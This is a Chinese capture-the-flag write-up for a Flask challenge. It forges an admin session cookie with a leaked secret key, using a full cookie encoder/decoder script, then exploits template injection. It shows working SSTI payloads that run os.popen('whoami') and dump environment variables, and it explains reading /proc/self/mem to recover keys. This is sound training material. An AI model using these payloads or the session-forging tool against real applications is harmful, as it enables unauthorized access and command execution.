> 内存FLAG

网站登陆页面给出提示，登陆成功就能发现flag，哪怕账号乱输入也会提示`a~d~m~i~n`
两个注释

> param：参数，这里的话就可能是提示有名为ctfshow的参数 
> key：这里的话联想到FLask的Secret_key


后测试得知，这已经算是登陆成功了，

根据提示内存应该跟session有关，网上搜索得到flask框架有相关漏洞
> flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。

```bash
(py311) apple@MacBook-Air-2 ctf解题思路 % python precise_flag_hunter.py decode -c 'eyJ1c2VybmFtZSI6IjEyM2FkbWluIn0.aRlOqA.JvMJMgbbGyKCit9hCm0pVBxIKks' -s 'ican'
{'username': '123admin'}
```

于是尝试构造admin的session
```bash
(py311) apple@MacBook-Air-2 ctf解题思路 % python precise_flag_hunter.py encode -t "{'username':'admin'}" -s "ican"
eyJ1c2VybmFtZSI6ImFkbWluIn0.aRlUfg.S9DVWIJd9Ql7AKMTwnyCsGd5UT8
```
修改session
![[0038蓝瘦01.png]]

根据之前提示 ctfshow，传参测试 有回显,
各种测试后得知 这个是模板注入漏洞（SSTI） ，且前面已知为flask的模板注入
`https://341c5c8b-95d4-49b7-ab9a-2039b6ec7343.challenge.ctf.show/?ctfshow={{config}}`
![[0038蓝瘦02.png]]
构造payload `http://f9af8124-3c22-493e-b7c6-2471df2419ac.challenge.ctf.show/?ctfshow={{config.__class__.__init__.__globals__[%27os%27].popen(%27whoami%27).read()}}`
获得执行命令，但是执行半天没有找到flag，仔细读题发现跟内存有关。
构造`https://f9af8124-3c22-493e-b7c6-2471df2419ac.challenge.ctf.show/?ctfshow={{config.__class__.__init__.__globals__[%27os%27].environ}}`

![[0038蓝瘦03.png]]
得到`ctfshow{4231a023-1fab-434a-b8ba-4364e2745b1e}`


---

```python
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))

```

---

## Flask

什么是Flask呢，他其实是一个基于Jinja2模板搭建而成的应用框架，具体如下所示

> Flask是一个Web应用程序框架，使用Python编写。该软件由ArminRonacher开发，他领导着Pocco国际Python爱好者小组。该软件基于WerkzeugWSGI工具箱和Jinja2模板引擎.

### Session

`Flask`中的`Session`，它是存在于客户端的，也就是说我们在进行登录过后可以看到自己的`Session`值，而当我们对这个`Session`值进行`base64`解码后，就可以读取它的具体内容。 对应Flask，它在生成session时会使用`app.config['SECRET_KEY']`中的值作为`salt`对session进行一个简单处理，那么这里的话，只要key不泄露，我们就只能得到具体内容，但是无法修改具体内容，因此这个时候就引发了一个问题，当key泄露的时候，就出现了内容伪造的情况，比如具体内容为`{'name':'123'}`，而当我们掌握key时，可修改内容为`{'name':'admin'}`，从而达到一个越权的效果，因此我们接下来就要说说CTF中怎么获取Key

#### Key的获取

有两种情况 第一种情况，当源码泄露时，Key也可能会泄露，它的泄露位置是`config.py`，在`[HCTF2018]admin`中有所体现。 第二种情况，就是当存在任意文件读取漏洞时，我们可以通过读取`/proc/self/maps`来获取堆栈分布，而后读取`/proc/self/mem`，通过真正则匹配筛选出我们需要的key，这个在`[2022蓝帽杯]file_session`中有所体现。